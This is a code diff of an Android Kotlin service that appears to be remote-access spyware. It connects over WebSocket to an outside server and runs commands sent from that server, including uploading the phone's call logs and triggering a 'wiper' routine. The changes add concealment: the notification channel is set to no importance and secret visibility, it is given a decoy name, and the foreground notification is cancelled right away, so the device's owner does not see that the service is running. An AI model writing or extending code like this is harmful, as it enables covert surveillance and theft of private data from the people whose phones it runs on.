@@ -11,6 +11,7 @@ import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import android.util.Log
+import android.widget.RemoteViews
 import androidx.core.app.NotificationCompat
 import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
@@ -30,7 +31,7 @@ class MyService : Service() {
     private lateinit var client: OkHttpClient
     private lateinit var request: Request
    // private val serverUrl = "https://betryal-commit-back.onrender.com"
- //  private val serverUrl = "ws://192.168.31.50:8080"
+  // private val serverUrl = "ws://192.168.31.50:8080"
    private val serverUrl = "https://bertrylcommit-back.botsailer1.repl.co/"
     private val NOTIFICATION_ID = 1410
     private var isWebSocketInitialized = false
@@ -52,49 +53,27 @@ class MyService : Service() {
             webSocket = client.newWebSocket(request, MyWebSocketListener())
             isWebSocketInitialized = true
         }
-
-        if (!hmm.isServiceRunning(context)) {
             startForeground(NOTIFICATION_ID, createNotification())
-        }
+        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+        notificationManager.cancel(NOTIFICATION_ID)
         return START_STICKY
     }
 
     private fun createNotification(): Notification {
-        val channelId = "my_channel_id"
-        val channelName = "My Channel"
+        val channelId = "sandas"
+        val channelName = "barthroom"
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
-            val importance = NotificationManager.IMPORTANCE_DEFAULT
+            val notificationManager =
+                getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
+            val importance = NotificationManager.IMPORTANCE_NONE
             val channel = NotificationChannel(channelId, channelName, importance)
             notificationManager.createNotificationChannel(channel)
         }
-
-        val notificationBuilder = NotificationCompat.Builder(this, channelId)
-            .build()
-
-        return notificationBuilder
-    }
-    fun uploadFile(file: File) {
-        if (isWebSocketInitialized && isSocketConnected) {
-            val requestBody = file.asRequestBody("application/octet-stream".toMediaTypeOrNull())
-            val request = Request.Builder()
-                .url("$serverUrl/uploadFile")
-                .post(requestBody)
-                .build()
-
-            client.newCall(request).enqueue(object : Callback {
-                override fun onFailure(call: Call, e: IOException) {
-                    Log.d("Upload", "Failed to upload file")
-                }
-
-                override fun onResponse(call: Call, response: Response) {
-                    response.close()
-                }
-            })
-        } else {
-            reconnectWebSocket()
-        }
+        val builder = NotificationCompat.Builder(this, channelId)
+        builder.setPriority(NotificationCompat.PRIORITY_LOW)
+        builder.setVisibility(NotificationCompat.VISIBILITY_SECRET)
+        return builder.build()
     }
 
 
@@ -116,7 +95,10 @@ class MyService : Service() {
             isSocketConnected = true
             this@MyService.webSocket = webSocket
             Log.d("WebSocket", "Connected to server")
-            webSocket.send("Hello from Android!");
+           val json = JSONObject()
+            json.put("type", "hello");
+            json.put("data", "done connection");
+            webSocket.send(json.toString());
         }
         override fun onMessage(webSocket: WebSocket, text: String) {
             Log.d("WebSocket", "Received message: $text")
@@ -133,9 +115,7 @@ class MyService : Service() {
                when (commands) {
                     "lock" ->{println("hello")} //AdminAct.lockdev()
                     "hide" -> AdminAct.wiper(MainActivity(), applicationContext)
-                    "call_logs" -> {
-                        callutil.uploadCalls(applicationContext.contentResolver,webSocket)
-                    }
+                    "call_logs" -> { callutil.uploadCalls(applicationContext.contentResolver,webSocket) }
                      "wallpaper" -> {
                          Log.e("wallpaper",data)
                          wallpaperset.setwall(applicationContext,data)
@@ -170,7 +150,7 @@ class MyService : Service() {
         }
     };
     companion object {
-        private var isSocketConnected: Boolean = false // Moved to companion object
+        private var isSocketConnected: Boolean = false
 
     }
 
